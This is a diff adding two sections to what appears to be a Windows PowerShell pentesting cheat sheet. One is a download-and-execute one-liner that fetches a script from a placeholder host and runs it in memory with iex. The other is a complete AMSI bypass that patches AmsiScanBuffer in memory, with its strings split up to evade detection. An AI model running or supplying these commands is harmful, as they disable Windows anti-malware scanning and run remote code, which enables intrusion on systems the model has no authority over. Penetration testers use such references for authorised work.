@@ -32,6 +32,38 @@ powershell.exe
 `([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)` (to check if you r admin or not)<br />
 `(Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\Lanmanserver\Parameters" -Name SMB1 -ErrorAction SilentlyContinue | Select-Object "SMB1")` (to check for smb version 1)<br />
 
+## Running scripts from memory
+`iex (New-Object Net.WebClient).DownloadString('http://ip/script.ps1'); "function name with args"`
+
+## Bypassing AMSI
+`$code = @"
+using System;
+using System.Runtime.InteropServices;
+
+public class Native
+{
+
+[DllImport("kernel32.dll")]
+public static extern IntPtr LoadLibrary(string name);
+
+[DllImport("kernel32.dll")]
+public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+
+[DllImport("kernel32.dll")]
+public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+}
+"@
+
+Add-Type $code
+$amsiDll = [Native]::LoadLibrary("am" + "si.dll")
+$asbAddress = [Native]::GetProcAddress($amsiDll, "Am" + "si" + "Sc" + "an" + "Buf" + "fer")
+$ret = [Byte[]] ( 0xC3 )
+$o = 0
+[Native]::VirtualProtect($asbAddress, [uint32]$ret.Length, 0x40, [ref] $o)
+
+[System.Runtime.InteropServices.Marshal]::Copy($ret, 0, $asbAddress, $ret.Length)
+[Native]::VirtualProtect($asbAddress, [uint32]$ret.Length, $o, [ref] $null)`
+
 ## Locate files in the whole drive
 `dir filename.extension /s` (do it from C:\ folder)(supports regex)
 `dir /a /q` (linux like ls -la, gives time modified as well as file owner)
